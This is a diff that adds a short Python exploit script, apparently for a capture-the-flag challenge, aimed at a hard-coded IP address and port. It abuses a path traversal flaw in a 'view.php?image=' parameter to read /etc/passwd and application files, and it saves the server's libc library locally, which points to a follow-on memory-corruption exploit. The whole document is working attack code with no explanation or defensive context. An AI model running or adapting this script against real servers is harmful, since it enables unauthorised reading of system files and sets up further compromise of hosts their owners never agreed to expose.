@@ -1,0 +1,23 @@
+import requests, re, base64
+
+host = '94.237.50.128'
+port = '38407'
+url = f'http://{host}:{port}'
+
+def get_file(path):
+    r = requests.get(f'{url}/view.php?image={path}')
+    m = re.search(r'data:image/png;base64,([^"]+)', r.text)
+    return base64.b64decode(m.group(1)) if m else None
+
+data1 = get_file('/../../../../etc/passwd')
+print(data1.decode() if data1 else '')
+
+libc = get_file('/../../../../usr/lib/x86_64-linux-gnu/libc.so.6')
+if libc:
+    open('./libc.so.6', 'wb').write(libc)
+
+data2 = get_file('/app/test.png')
+print(data2[:100] if data2 else '')
+
+data3 = get_file('/app/deb756bcdc4a1acd611c34a742c0436ad29202f1496e737e1d76bd025a60140e')
+print(data3.decode() if data3 else '')
